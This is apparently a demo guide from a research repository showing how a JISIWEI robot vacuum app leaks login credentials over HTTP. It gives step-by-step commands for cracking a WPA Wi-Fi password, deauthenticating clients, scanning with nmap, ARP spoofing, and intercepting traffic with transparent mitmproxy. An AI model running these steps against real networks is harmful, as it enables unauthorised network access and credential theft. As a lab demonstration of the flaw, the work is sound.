# HOW TO DEMO

## Setup
A computer with these tools have to be fixed:
- **Android Smartphone**, with the JISIWEI application installed. iOS app can be found here: https://apps.apple.com/us/app/极思维机器人/id937665306 and the APK file for the Android app is found in this repository.
- **USB cable**, for connecting smarphone to PC
- **Aircrack-ng**, for cracking the wifi-password
- **nmap**, used for finding devices in network
- **arpspoof**, needed for transparant proxy
- **mitmproxy**, proxy used for looking at HTTP packets
- **Wireless Network Adapter**, needed for cracking the wifi and connecting to wifi
- **Wireless Router**, with relatively easy password for dictionary attack
- **JISIWEI Vacuum Cleaner Robot**

The computer **Dell OptiPlex 7070** should have everything installed. If you use the **TP-Link High-Gain 150Mbps** wireless adapter, you won't have to install any necessary drivers.

## Step 1
Use Aircrack-ng with the wireless network adapter to crack the password to the router.

But first we have to set the wireless adapter to monitor mode, Either run the script **monitor_mode.sh** or do the following:

```bash
airmon-ng check kill
rfkill unblock all
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

We can then check what networks are available in the area:

```bash
airodump-ng wlan0
```

Take the BSSID and channel from the WIFI we will hack and do the following:
```bash
airodump-ng -c [channel for wifi] --bssid [BSSID for wifi] -w psk wlan0
```
We will now wait on a WPA handshake, we could make this process faster by taking a BSSID of a host that is connected to the wifi.
Easiest way to accomplish this is by having your smartphone connected to the wifi.

```bash
aireplay-ng -0 0 -a [BSSID of wifi] -c [BSSID of host] wlan0
```

When we have the handshake you can terminate the previous programs. 

Now use aircrack-ng with a password list and get the password.

```bash
aircrack-ng -w rockyou.txt -b [BSSID of wifi] psk*.cap
```

Now you can set the mode for the wireless adapter to Auto and then login to the wifi. Either run the script auto_mode.sh or do the following:

```bash
systemctl start NetworkManager
ifconfig wlan0 down
iwconfig wlan0 mode Auto
ifconfig wlan0 up
```

## Step 2
Login to the wifi.

Use Nmap to see the devices in the network.
```bash
nmap -sn 192.168.1.127/24
```
Check ports on all the devices found in the network. We will need the router and a phone.


## Step 3
Either run the script **spoof.sh** or do all the steps down below.

First we will setup port forwarding before using arpspoof and mitmproxy:

```bash
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

Then open make sure to have three terminals opened and each command in separate terminals:

```bash
arpspoof -i wlan0 -t [PHONE_IP] [ROUTER_IP]
arpspoof -i wlan0 -t [ROUTER_IP] [PHONE_IP] 
```

Start mitmproxy in transparent mode in the third terminal and wait till someone logs in to the robot on the same network.

```bash
mitmproxy --mode transparent --showhost
```

Use the smartphone and log in to the JISIWEI application while on the same network.

Use the credentials:

username: hackmanhacker8@gmail.com

password: proofofconcept

When you have logged in you can see the credentials in the HTTP request. Meaning that the attacker now has access to those credentials and is now able to login to the app and controll the vacuum cleaner robot.

## Step 4

Login to the application using the smartphone showing that it is the same credentials and use the functions of the application.
The attacker could then login whenever they pleases without being in the network.
Using an android device you could display the screen of the phone on a the bigger screen. The "USB-Debug" has to be allowd, which can be found in the developer settings on the smarthphone. Use the following tool: 
```bash
srcpcopy 
```